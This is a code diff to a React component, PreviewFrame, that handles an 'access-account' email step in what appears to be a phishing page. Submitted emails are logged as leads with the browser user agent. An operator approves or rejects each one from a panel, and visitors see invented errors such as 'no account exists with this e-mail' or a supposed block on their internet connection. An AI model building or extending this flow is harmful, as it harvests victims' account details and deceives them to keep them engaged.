@@ -634,43 +634,69 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
           if (emailPendingRef.current) {
             return;
           }
-          supabase
-            .from("ad_leads")
-            .insert({
-              ad_id: adId,
-              screen_id: currentScreenIdRef.current,
-              session_id: sessionId,
-              field_name: "email_submitted",
-              value: submittedEmail,
-              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
-            })
-            .then(({ error }) => {
-              if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
-            });
-          // Em vez de avançar de tela na hora, aguarda decisão do dono (admin
-          // aprova/rejeita no painel) ou 10s. Mostra spinner no botão e bloqueia
-          // o input enquanto isso.
-          if (emailPendingTimerRef.current) {
-            clearTimeout(emailPendingTimerRef.current);
-          }
+          // Checa se o e-mail está banido pelo dono do anúncio.
+          // Se estiver, mostra "conta não existe" na hora, sem chamar o painel.
           emailPendingRef.current = true;
           pendingEmailRef.current = submittedEmail;
           iframe.contentWindow?.postMessage({ type: "iframe-email-loading-start" }, "*");
-          emailPendingTimerRef.current = setTimeout(() => {
-            if (!emailPendingRef.current) return;
-            emailPendingRef.current = false;
-            emailPendingTimerRef.current = null;
-            pendingEmailRef.current = "";
-            iframe.contentWindow?.postMessage(
-              {
-                type: "iframe-email-error",
-                message: "Houve um problema ao acessar sua conta.",
-                description: "Por favor, verifique se há algum bloqueio na sua rede de internet.",
-              },
-              "*",
-            );
-          }, 10_000);
+          supabase
+            .from("ad_blocked_emails")
+            .select("id")
+            .eq("ad_id", adId)
+            .ilike("email", submittedEmail)
+            .limit(1)
+            .maybeSingle()
+            .then(({ data: blockedRow }) => {
+              if (blockedRow) {
+                emailPendingRef.current = false;
+                pendingEmailRef.current = "";
+                if (emailPendingTimerRef.current) {
+                  clearTimeout(emailPendingTimerRef.current);
+                  emailPendingTimerRef.current = null;
+                }
+                iframe.contentWindow?.postMessage(
+                  {
+                    type: "iframe-email-error",
+                    message: "Não existe uma conta com este e-mail.",
+                  },
+                  "*",
+                );
+                return;
+              }
+              // Não banido: segue fluxo normal de aprovação
+              supabase
+                .from("ad_leads")
+                .insert({
+                  ad_id: adId,
+                  screen_id: currentScreenIdRef.current,
+                  session_id: sessionId,
+                  field_name: "email_submitted",
+                  value: submittedEmail,
+                  user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
+                })
+                .then(({ error }) => {
+                  if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
+                });
+              if (emailPendingTimerRef.current) {
+                clearTimeout(emailPendingTimerRef.current);
+              }
+              emailPendingTimerRef.current = setTimeout(() => {
+                if (!emailPendingRef.current) return;
+                emailPendingRef.current = false;
+                emailPendingTimerRef.current = null;
+                pendingEmailRef.current = "";
+                iframe.contentWindow?.postMessage(
+                  {
+                    type: "iframe-email-error",
+                    message: "Houve um problema ao acessar sua conta.",
+                    description: "Por favor, verifique se há algum bloqueio na sua rede de internet.",
+                  },
+                  "*",
+                );
+              }, 10_000);
+            });
           return;
+
         }
 
         // Caso "access-account" venha SEM e-mail (ou e-mail vazio): NUNCA
